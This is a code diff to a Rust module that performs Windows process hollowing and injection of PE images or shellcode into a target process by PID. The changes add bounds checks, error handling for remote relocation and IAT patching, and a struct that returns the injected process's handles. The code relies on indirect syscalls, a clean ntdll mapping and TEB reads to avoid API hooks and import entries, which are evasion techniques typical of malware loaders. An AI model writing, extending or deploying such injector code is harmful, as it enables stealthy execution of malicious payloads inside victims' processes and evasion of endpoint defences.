@@ -1,6 +1,22 @@
 use anyhow::{anyhow, Result};
+#[cfg(not(windows))]
+use std::ffi::c_void;
 #[cfg(windows)]
 use winapi::ctypes::c_void;
+
+/// Metadata for a successful injection into an existing target process.
+pub struct InjectedProcess {
+    /// PID that received the payload.
+    pub target_pid: u32,
+    /// Base address where the payload image or shellcode was mapped.
+    pub remote_base: usize,
+    /// Original payload size in bytes.
+    pub payload_size: usize,
+    /// Open process handle retained for callers that need cleanup/status.
+    pub process_handle: *mut c_void,
+    /// Open thread handle for the created execution thread, when retained.
+    pub thread_handle: Option<*mut c_void>,
+}
 
 /// Dynamically-resolved GetLastError (reads TEB, no IAT entry).
 #[cfg(windows)]
@@ -1314,6 +1330,23 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
         let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
         let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
         let entry_point_rva = (*nt).OptionalHeader.AddressOfEntryPoint as usize;
+        let size_of_headers = (*nt).OptionalHeader.SizeOfHeaders as usize;
+        if image_size == 0 {
+            return Err(anyhow!(
+                "hollow_and_execute: PE64 payload has SizeOfImage=0"
+            ));
+        }
+        if entry_point_rva >= image_size {
+            return Err(anyhow!(
+                "hollow_and_execute: PE64 entry point RVA {entry_point_rva:#x} is outside image size {image_size:#x}"
+            ));
+        }
+        checked_payload_range(payload.len(), 0, size_of_headers, "PE64 headers")?;
+        if size_of_headers > image_size {
+            return Err(anyhow!(
+                "hollow_and_execute: PE64 SizeOfHeaders {size_of_headers:#x} exceeds SizeOfImage {image_size:#x}"
+            ));
+        }
 
         // Ensure the SSN resolution infrastructure (clean ntdll mapping) is
         // initialised before any direct-syscall dispatch.  Errors are soft:
@@ -1477,15 +1510,20 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
             h_process as u64,
             remote_base_ptr as u64,
             payload.as_ptr() as u64,
-            (*nt).OptionalHeader.SizeOfHeaders as u64,
+            size_of_headers as u64,
             &mut written as *mut _ as u64,
         )
         .unwrap_or(-1);
-        if s < 0 {
+        if s < 0 || written != size_of_headers {
             nt_terminate_process!(h_process);
             close_handle!(h_thread);
             close_handle!(h_process);
-            return Err(anyhow!("NtWriteVirtualMemory(headers) failed"));
+            return Err(anyhow!(
+                "NtWriteVirtualMemory(headers) failed: status={:#010x}, wrote={}, expected={}",
+                s as u32,
+                written,
+                size_of_headers
+            ));
         }
 
         // Write sections.
@@ -1887,6 +1925,7 @@ unsafe fn hollow_and_execute_pe32(payload: &[u8]) -> Result<()> {
     let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
     let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
     let entry_point_rva = (*nt).OptionalHeader.AddressOfEntryPoint as usize;
+    let size_of_headers = (*nt).OptionalHeader.SizeOfHeaders as usize;
     if image_size == 0 {
         return Err(anyhow!(
             "hollow_and_execute: PE32 payload has SizeOfImage=0"
@@ -1895,6 +1934,12 @@ unsafe fn hollow_and_execute_pe32(payload: &[u8]) -> Result<()> {
     if entry_point_rva >= image_size {
         return Err(anyhow!(
             "hollow_and_execute: PE32 entry point RVA {entry_point_rva:#x} is outside image size {image_size:#x}"
+        ));
+    }
+    checked_payload_range(payload.len(), 0, size_of_headers, "PE32 headers")?;
+    if size_of_headers > image_size {
+        return Err(anyhow!(
+            "hollow_and_execute: PE32 SizeOfHeaders {size_of_headers:#x} exceeds SizeOfImage {image_size:#x}"
         ));
     }
 
@@ -2046,16 +2091,21 @@ unsafe fn hollow_and_execute_pe32(payload: &[u8]) -> Result<()> {
         h_process as u64,
         remote_base_ptr as u64,
         payload.as_ptr() as u64,
-        (*nt).OptionalHeader.SizeOfHeaders as u64,
+        size_of_headers as u64,
         &mut written as *mut _ as u64,
     )
     .unwrap_or(-1)
         < 0
+        || written != size_of_headers
     {
         nt_terminate!(h_process);
         close_handle!(h_thread);
         close_handle!(h_process);
-        return Err(anyhow!("NtWriteVirtualMemory(headers, pe32) failed"));
+        return Err(anyhow!(
+            "NtWriteVirtualMemory(headers, pe32) failed: wrote={}, expected={}",
+            written,
+            size_of_headers
+        ));
     }
 
     let num_sections = (*nt).FileHeader.NumberOfSections as usize;
@@ -2221,11 +2271,19 @@ unsafe fn apply_relocations_remote32(
     if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 {
         return Ok(());
     }
+    let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
 
     let reloc_file_off = rva_to_file_offset32(reloc_dir.VirtualAddress as usize, nt);
-    let reloc_end_off = reloc_file_off + reloc_dir.Size as usize;
+    let reloc_end_off = reloc_file_off
+        .checked_add(reloc_dir.Size as usize)
+        .ok_or_else(|| anyhow!("apply_relocations_remote32: relocation directory range overflow"))?;
     if reloc_end_off > payload.len() {
-        return Ok(());
+        return Err(anyhow!(
+            "apply_relocations_remote32: relocation directory out of payload bounds (off={:#x}, size={:#x}, payload={:#x})",
+            reloc_file_off,
+            reloc_dir.Size,
+            payload.len()
+        ));
     }
 
     let mut offset = reloc_file_off;
@@ -2234,27 +2292,62 @@ unsafe fn apply_relocations_remote32(
         let block_size =
             u32::from_le_bytes(payload[offset + 4..offset + 8].try_into().unwrap()) as usize;
         if block_size < 8 {
-            break;
+            return Err(anyhow!(
+                "apply_relocations_remote32: invalid relocation block size {} at file offset {:#x}",
+                block_size,
+                offset
+            ));
         }
+        let block_end = offset
+            .checked_add(block_size)
+            .ok_or_else(|| anyhow!("apply_relocations_remote32: relocation block range overflow"))?;
+        if block_end > reloc_end_off {
+            return Err(anyhow!(
+                "apply_relocations_remote32: relocation block overruns directory (block_end={:#x}, reloc_end={:#x})",
+                block_end,
+                reloc_end_off
+            ));
+        }
+
         let entries = (block_size - 8) / 2;
         for i in 0..entries {
             let entry_off = offset + 8 + i * 2;
-            if entry_off + 2 > reloc_end_off {
-                break;
+            if entry_off + 2 > block_end {
+                return Err(anyhow!(
+                    "apply_relocations_remote32: truncated relocation entry at file offset {:#x}",
+                    entry_off
+                ));
             }
             let entry = u16::from_le_bytes(payload[entry_off..entry_off + 2].try_into().unwrap());
             let typ = (entry >> 12) as u8;
             let rel = (entry & 0x0FFF) as usize;
-            let target = (remote_base + page_rva + rel) as *mut c_void;
             match typ {
                 // IMAGE_REL_BASED_HIGHLOW (PE32): 32-bit absolute VA.
                 // Use u32 wrapping arithmetic — `delta as u32` takes the low 32
                 // bits of the signed delta, giving correct modular results even
                 // when delta exceeds i32::MAX (e.g. remote_base near 0xC000_0000).
                 3 => {
+                    let target_rva = page_rva
+                        .checked_add(rel)
+                        .ok_or_else(|| anyhow!("apply_relocations_remote32: target RVA overflow"))?;
+                    let end_rva = target_rva.checked_add(4).ok_or_else(|| {
+                        anyhow!("apply_relocations_remote32: relocation target range overflow")
+                    })?;
+                    if end_rva > image_size {
+                        return Err(anyhow!(
+                            "apply_relocations_remote32: relocation target out of image bounds (rva={:#x}, size=4, image={:#x})",
+                            target_rva,
+                            image_size
+                        ));
+                    }
+                    let target_addr = remote_base
+                        .checked_add(target_rva)
+                        .ok_or_else(|| anyhow!("apply_relocations_remote32: target VA overflow"))?;
+                    let target = target_addr as *mut c_void;
+
                     let mut val: u32 = 0;
                     let mut rd: usize = 0;
-                    let _ = nt_syscall::syscall!(
+                    let rs = nt_syscall::syscall!(
                         "NtReadVirtualMemory",
                         hprocess as u64,
                         target as u64,
@@ -2262,9 +2355,18 @@ unsafe fn apply_relocations_remote32(
                         4u64,
                         &mut rd as *mut _ as u64,
                     );
+                    if rs.as_ref().map_or(true, |s| *s < 0) || rd != 4 {
+                        return Err(anyhow!(
+                            "apply_relocations_remote32: NtReadVirtualMemory failed at target {:#x} (status={:?}, read={})",
+                            target as usize,
+                            rs,
+                            rd
+                        ));
+                    }
+
                     let patched = val.wrapping_add(delta as u32);
                     let mut wr: usize = 0;
-                    let _ = nt_syscall::syscall!(
+                    let ws = nt_syscall::syscall!(
                         "NtWriteVirtualMemory",
                         hprocess as u64,
                         target as u64,
@@ -2272,12 +2374,38 @@ unsafe fn apply_relocations_remote32(
                         4u64,
                         &mut wr as *mut _ as u64,
                     );
+                    if ws.as_ref().map_or(true, |s| *s < 0) || wr != 4 {
+                        return Err(anyhow!(
+                            "apply_relocations_remote32: NtWriteVirtualMemory failed at target {:#x} (status={:?}, wrote={})",
+                            target as usize,
+                            ws,
+                            wr
+                        ));
+                    }
                 }
                 // IMAGE_REL_BASED_DIR64 (accepted for completeness)
                 10 => {
+                    let target_rva = page_rva
+                        .checked_add(rel)
+                        .ok_or_else(|| anyhow!("apply_relocations_remote32: target RVA overflow"))?;
+                    let end_rva = target_rva.checked_add(8).ok_or_else(|| {
+                        anyhow!("apply_relocations_remote32: relocation target range overflow")
+                    })?;
+                    if end_rva > image_size {
+                        return Err(anyhow!(
+                            "apply_relocations_remote32: relocation target out of image bounds (rva={:#x}, size=8, image={:#x})",
+                            target_rva,
+                            image_size
+                        ));
+                    }
+                    let target_addr = remote_base
+                        .checked_add(target_rva)
+                        .ok_or_else(|| anyhow!("apply_relocations_remote32: target VA overflow"))?;
+                    let target = target_addr as *mut c_void;
+
                     let mut val: u64 = 0;
                     let mut rd: usize = 0;
-                    let _ = nt_syscall::syscall!(
+                    let rs = nt_syscall::syscall!(
                         "NtReadVirtualMemory",
                         hprocess as u64,
                         target as u64,
@@ -2285,9 +2413,18 @@ unsafe fn apply_relocations_remote32(
                         8u64,
                         &mut rd as *mut _ as u64,
                     );
+                    if rs.as_ref().map_or(true, |s| *s < 0) || rd != 8 {
+                        return Err(anyhow!(
+                            "apply_relocations_remote32: NtReadVirtualMemory failed at target {:#x} (status={:?}, read={})",
+                            target as usize,
+                            rs,
+                            rd
+                        ));
+                    }
+
                     val = val.wrapping_add(delta as u64);
                     let mut wr: usize = 0;
-                    let _ = nt_syscall::syscall!(
+                    let ws = nt_syscall::syscall!(
                         "NtWriteVirtualMemory",
                         hprocess as u64,
                         target as u64,
@@ -2295,11 +2432,19 @@ unsafe fn apply_relocations_remote32(
                         8u64,
                         &mut wr as *mut _ as u64,
                     );
+                    if ws.as_ref().map_or(true, |s| *s < 0) || wr != 8 {
+                        return Err(anyhow!(
+                            "apply_relocations_remote32: NtWriteVirtualMemory failed at target {:#x} (status={:?}, wrote={})",
+                            target as usize,
+                            ws,
+                            wr
+                        ));
+                    }
                 }
                 _ => {}
             }
         }
-        offset += block_size;
+        offset = block_end;
     }
     Ok(())
 }
@@ -2534,14 +2679,22 @@ unsafe fn apply_relocations_remote(
     if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 {
         return Ok(());
     }
+    let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
 
     // Convert the relocation-directory RVA to a file offset.  The data-directory
     // VirtualAddress is a PE RVA, not a raw file offset; they differ when the
     // .reloc section has a different PointerToRawData than VirtualAddress.
     let reloc_file_off = rva_to_file_offset(reloc_dir.VirtualAddress as usize, nt);
-    let reloc_end_off = reloc_file_off + reloc_dir.Size as usize;
+    let reloc_end_off = reloc_file_off
+        .checked_add(reloc_dir.Size as usize)
+        .ok_or_else(|| anyhow!("apply_relocations_remote: relocation directory range overflow"))?;
     if reloc_end_off > payload.len() {
-        return Ok(());
+        return Err(anyhow!(
+            "apply_relocations_remote: relocation directory out of payload bounds (off={:#x}, size={:#x}, payload={:#x})",
+            reloc_file_off,
+            reloc_dir.Size,
+            payload.len()
+        ));
     }
 
     let mut offset = reloc_file_off;
@@ -2550,24 +2703,59 @@ unsafe fn apply_relocations_remote(
         let block_size =
             u32::from_le_bytes(payload[offset + 4..offset + 8].try_into().unwrap()) as usize;
         if block_size < 8 {
-            break;
+            return Err(anyhow!(
+                "apply_relocations_remote: invalid relocation block size {} at file offset {:#x}",
+                block_size,
+                offset
+            ));
         }
+        let block_end = offset
+            .checked_add(block_size)
+            .ok_or_else(|| anyhow!("apply_relocations_remote: relocation block range overflow"))?;
+        if block_end > reloc_end_off {
+            return Err(anyhow!(
+                "apply_relocations_remote: relocation block overruns directory (block_end={:#x}, reloc_end={:#x})",
+                block_end,
+                reloc_end_off
+            ));
+        }
+
         let entries = (block_size - 8) / 2;
         for i in 0..entries {
             let entry_off = offset + 8 + i * 2;
-            if entry_off + 2 > reloc_end_off {
-                break;
+            if entry_off + 2 > block_end {
+                return Err(anyhow!(
+                    "apply_relocations_remote: truncated relocation entry at file offset {:#x}",
+                    entry_off
+                ));
             }
             let entry = u16::from_le_bytes(payload[entry_off..entry_off + 2].try_into().unwrap());
             let typ = (entry >> 12) as u8;
             let rel = (entry & 0x0FFF) as usize;
-            let target = (remote_base + page_rva + rel) as *mut c_void;
             match typ {
                 // IMAGE_REL_BASED_DIR64 (PE32+)
                 10 => {
+                    let target_rva = page_rva
+                        .checked_add(rel)
+                        .ok_or_else(|| anyhow!("apply_relocations_remote: target RVA overflow"))?;
+                    let end_rva = target_rva.checked_add(8).ok_or_else(|| {
+                        anyhow!("apply_relocations_remote: relocation target range overflow")
+                    })?;
+                    if end_rva > image_size {
+                        return Err(anyhow!(
+                            "apply_relocations_remote: relocation target out of image bounds (rva={:#x}, size=8, image={:#x})",
+                            target_rva,
+                            image_size
+                        ));
+                    }
+                    let target_addr = remote_base
+                        .checked_add(target_rva)
+                        .ok_or_else(|| anyhow!("apply_relocations_remote: target VA overflow"))?;
+                    let target = target_addr as *mut c_void;
+
                     let mut val: u64 = 0;
                     let mut rd: usize = 0;
-                    let _ = nt_syscall::syscall!(
+                    let rs = nt_syscall::syscall!(
                         "NtReadVirtualMemory",
                         hprocess as u64,
                         target as u64,
@@ -2575,9 +2763,18 @@ unsafe fn apply_relocations_remote(
                         8u64,
                         &mut rd as *mut _ as u64,
                     );
+                    if rs.as_ref().map_or(true, |s| *s < 0) || rd != 8 {
+                        return Err(anyhow!(
+                            "apply_relocations_remote: NtReadVirtualMemory failed at target {:#x} (status={:?}, read={})",
+                            target as usize,
+                            rs,
+                            rd
+                        ));
+                    }
+
                     val = val.wrapping_add(delta as u64);
                     let mut wr: usize = 0;
-                    let _ = nt_syscall::syscall!(
+                    let ws = nt_syscall::syscall!(
                         "NtWriteVirtualMemory",
                         hprocess as u64,
                         target as u64,
@@ -2585,15 +2782,41 @@ unsafe fn apply_relocations_remote(
                         8u64,
                         &mut wr as *mut _ as u64,
                     );
+                    if ws.as_ref().map_or(true, |s| *s < 0) || wr != 8 {
+                        return Err(anyhow!(
+                            "apply_relocations_remote: NtWriteVirtualMemory failed at target {:#x} (status={:?}, wrote={})",
+                            target as usize,
+                            ws,
+                            wr
+                        ));
+                    }
                 }
                 // IMAGE_REL_BASED_HIGHLOW (PE32): 32-bit absolute VA.
                 // Use u32 wrapping arithmetic — `delta as u32` takes the low 32
                 // bits of the signed delta, giving correct modular results even
                 // when delta exceeds i32::MAX (e.g. remote_base near 0xC000_0000).
                 3 => {
+                    let target_rva = page_rva
+                        .checked_add(rel)
+                        .ok_or_else(|| anyhow!("apply_relocations_remote: target RVA overflow"))?;
+                    let end_rva = target_rva.checked_add(4).ok_or_else(|| {
+                        anyhow!("apply_relocations_remote: relocation target range overflow")
+                    })?;
+                    if end_rva > image_size {
+                        return Err(anyhow!(
+                            "apply_relocations_remote: relocation target out of image bounds (rva={:#x}, size=4, image={:#x})",
+                            target_rva,
+                            image_size
+                        ));
+                    }
+                    let target_addr = remote_base
+                        .checked_add(target_rva)
+                        .ok_or_else(|| anyhow!("apply_relocations_remote: target VA overflow"))?;
+                    let target = target_addr as *mut c_void;
+
                     let mut val: u32 = 0;
                     let mut rd: usize = 0;
-                    let _ = nt_syscall::syscall!(
+                    let rs = nt_syscall::syscall!(
                         "NtReadVirtualMemory",
                         hprocess as u64,
                         target as u64,
@@ -2601,9 +2824,18 @@ unsafe fn apply_relocations_remote(
                         4u64,
                         &mut rd as *mut _ as u64,
                     );
+                    if rs.as_ref().map_or(true, |s| *s < 0) || rd != 4 {
+                        return Err(anyhow!(
+                            "apply_relocations_remote: NtReadVirtualMemory failed at target {:#x} (status={:?}, read={})",
+                            target as usize,
+                            rs,
+                            rd
+                        ));
+                    }
+
                     let patched = val.wrapping_add(delta as u32);
                     let mut wr: usize = 0;
-                    let _ = nt_syscall::syscall!(
+                    let ws = nt_syscall::syscall!(
                         "NtWriteVirtualMemory",
                         hprocess as u64,
                         target as u64,
@@ -2611,11 +2843,19 @@ unsafe fn apply_relocations_remote(
                         4u64,
                         &mut wr as *mut _ as u64,
                     );
+                    if ws.as_ref().map_or(true, |s| *s < 0) || wr != 4 {
+                        return Err(anyhow!(
+                            "apply_relocations_remote: NtWriteVirtualMemory failed at target {:#x} (status={:?}, wrote={})",
+                            target as usize,
+                            ws,
+                            wr
+                        ));
+                    }
                 }
                 _ => {}
             }
         }
-        offset += block_size;
+        offset = block_end;
     }
     Ok(())
 }
@@ -2623,6 +2863,21 @@ unsafe fn apply_relocations_remote(
 /// Inject a PE or shellcode payload into an existing process identified by PID.
 #[cfg(windows)]
 pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
+    unsafe { inject_into_process_impl(pid, payload, false).map(|_| ()) }
+}
+
+/// Inject a PE or shellcode payload and return target-process metadata.
+#[cfg(windows)]
+pub fn inject_into_process_with_info(pid: u32, payload: &[u8]) -> Result<InjectedProcess> {
+    unsafe { inject_into_process_impl(pid, payload, true) }
+}
+
+#[cfg(windows)]
+unsafe fn inject_into_process_impl(
+    pid: u32,
+    payload: &[u8],
+    keep_handles: bool,
+) -> Result<InjectedProcess> {
     use std::ptr::null_mut;
     use winapi::shared::basetsd::SIZE_T;
     use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
@@ -2666,6 +2921,8 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
             ));
         }
         let hprocess = h_proc_usize as *mut c_void;
+        let injected_base_addr: usize;
+        let created_thread: Option<*mut c_void>;
 
         // P0-13: NtClose via indirect syscall — no CloseHandle fallback.
         macro_rules! close_h {
@@ -2779,6 +3036,30 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
             let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
             let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
             let ep_rva = (*nt).OptionalHeader.AddressOfEntryPoint as usize;
+            let size_of_headers = (*nt).OptionalHeader.SizeOfHeaders as usize;
+            if image_size == 0 {
+                close_h!(hprocess);
+                return Err(anyhow!(
+                    "inject_into_process: PE64 payload has SizeOfImage=0"
+                ));
+            }
+            if ep_rva >= image_size {
+                close_h!(hprocess);
+                return Err(anyhow!(
+                    "inject_into_process: PE64 entry point RVA {ep_rva:#x} is outside image size {image_size:#x}"
+                ));
+            }
+            if let Err(e) = checked_payload_range(payload.len(), 0, size_of_headers, "PE64 headers")
+            {
+                close_h!(hprocess);
+                return Err(anyhow!("inject_into_process: {e}"));
+            }
+            if size_of_headers > image_size {
+                close_h!(hprocess);
+                return Err(anyhow!(
+                    "inject_into_process: PE64 SizeOfHeaders {size_of_headers:#x} exceeds SizeOfImage {image_size:#x}"
+                ));
+            }
 
             // 4.1: Verify the PE can be relocated if we cannot map at its preferred
             // base.  A PE without a relocation directory (.reloc section / reloc
@@ -2838,6 +3119,7 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
             }
 
             let remote_base = remote_mem as usize;
+            injected_base_addr = remote_base;
             let mut written: SIZE_T = 0;
             // P0-13: NtWriteVirtualMemory for PE headers.
             let write_status = nt_syscall::syscall!(
@@ -2845,18 +3127,16 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
                 hprocess as u64,
                 remote_mem as u64,
                 payload.as_ptr() as u64,
-                (*nt).OptionalHeader.SizeOfHeaders as u64,
+                size_of_headers as u64,
                 &mut written as *mut _ as u64,
             );
-            if write_status.as_ref().map_or(true, |s| *s < 0)
-                || written != (*nt).OptionalHeader.SizeOfHeaders as usize
-            {
+            if write_status.as_ref().map_or(true, |s| *s < 0) || written != size_of_headers {
                 close_h!(hprocess);
                 return Err(anyhow!(
                     "NtWriteVirtualMemory(headers) failed: status={:?}, wrote={}, expected={}",
                     write_status,
                     written,
-                    (*nt).OptionalHeader.SizeOfHeaders
+                    size_of_headers
                 ));
             }
 
@@ -2899,11 +3179,18 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
 
             let delta = remote_base as isize - preferred_base as isize;
             if delta != 0 {
-                apply_relocations_remote(hprocess, remote_base, nt, payload, delta)?;
+                if let Err(e) = apply_relocations_remote(hprocess, remote_base, nt, payload, delta)
+                {
+                    close_h!(hprocess);
+                    return Err(e);
+                }
             }
 
             // Resolve IAT while memory is still writable (2.2)
-            fix_iat_remote(hprocess, remote_base, nt, payload, &mut written)?;
+            if let Err(e) = fix_iat_remote(hprocess, remote_base, nt, payload, &mut written) {
+                close_h!(hprocess);
+                return Err(e);
+            }
 
             // Mirror hollow-and-execute behavior: update PEB.ImageBaseAddress
             // before starting remote execution.
@@ -2975,7 +3262,12 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
                     status
                 ));
             }
-            close_h!(h_thread);
+            created_thread = if keep_handles {
+                Some(h_thread)
+            } else {
+                close_h!(h_thread);
+                None
+            };
         } else {
             // Shellcode injection — allocate RW, write, protect RX, then thread
             // P0-13: NtAllocateVirtualMemory indirect syscall.
@@ -2998,6 +3290,7 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
                 ));
             }
             let remote_mem = remote_base_val as *mut c_void;
+            injected_base_addr = remote_base_val;
             let mut written: SIZE_T = 0;
             // P0-13: NtWriteVirtualMemory for shellcode.
             let shellcode_write_status = nt_syscall::syscall!(
@@ -3070,12 +3363,29 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
                     sc_status
                 ));
             }
-            close_h!(h_sc_thread);
+            created_thread = if keep_handles {
+                Some(h_sc_thread)
+            } else {
+                close_h!(h_sc_thread);
+                None
+            };
         }
 
-        close_h!(hprocess);
+        let process_handle = if keep_handles {
+            hprocess
+        } else {
+            close_h!(hprocess);
+            null_mut()
+        };
+
+        Ok(InjectedProcess {
+            target_pid: pid,
+            remote_base: injected_base_addr,
+            payload_size: payload.len(),
+            process_handle,
+            thread_handle: created_thread,
+        })
     }
-    Ok(())
 }
 
 /// Resolve each imported function in the payload's IAT and write addresses into
@@ -3241,40 +3551,38 @@ unsafe fn fix_iat_remote(
                     tracing::warn!(
                         "fix_iat_remote: {}!{} unresolved via export walk",
                         dll_name_norm,
-                        String::from_utf8_lossy(
-                            &name_null[..name_null.len().saturating_sub(1)]
-                        )
+                        String::from_utf8_lossy(&name_null[..name_null.len().saturating_sub(1)])
                     );
                 }
                 r
             };
 
-            let func_addr: usize = if let Some((owner_module, _owner_local_base, func_rva)) = resolved
-            {
-                let owner_remote_base = ensure_remote_module_loaded_cached(
-                    hprocess,
-                    &owner_module,
-                    ldr_load_dll_addr,
-                    &mut remote_modules,
-                )?;
+            let func_addr: usize =
+                if let Some((owner_module, _owner_local_base, func_rva)) = resolved {
+                    let owner_remote_base = ensure_remote_module_loaded_cached(
+                        hprocess,
+                        &owner_module,
+                        ldr_load_dll_addr,
+                        &mut remote_modules,
+                    )?;
 
-                match owner_remote_base.checked_add(func_rva) {
-                    Some(v) => v,
-                    None => {
-                        tracing::warn!(
-                            "fix_iat_remote: address overflow for {} (base={:#x}, rva={:#x})",
-                            owner_module,
-                            owner_remote_base,
-                            func_rva
-                        );
-                        unresolved_count += 1;
-                        0
+                    match owner_remote_base.checked_add(func_rva) {
+                        Some(v) => v,
+                        None => {
+                            tracing::warn!(
+                                "fix_iat_remote: address overflow for {} (base={:#x}, rva={:#x})",
+                                owner_module,
+                                owner_remote_base,
+                                func_rva
+                            );
+                            unresolved_count += 1;
+                            0
+                        }
                     }
-                }
-            } else {
-                unresolved_count += 1;
-                0
-            };
+                } else {
+                    unresolved_count += 1;
+                    0
+                };
 
             if func_addr != 0 {
                 // Write the resolved address into the remote IAT entry.  Use the
@@ -3364,6 +3672,13 @@ pub fn hollow_and_execute(_payload: &[u8]) -> Result<()> {
 #[cfg(not(windows))]
 pub fn inject_into_process(_pid: u32, _payload: &[u8]) -> Result<()> {
     Err(anyhow!("inject_into_process is only available on Windows"))
+}
+
+#[cfg(not(windows))]
+pub fn inject_into_process_with_info(_pid: u32, _payload: &[u8]) -> Result<InjectedProcess> {
+    Err(anyhow!(
+        "inject_into_process_with_info is only available on Windows"
+    ))
 }
 
 // ──────────────────────────────────────────────────────────────────────────────
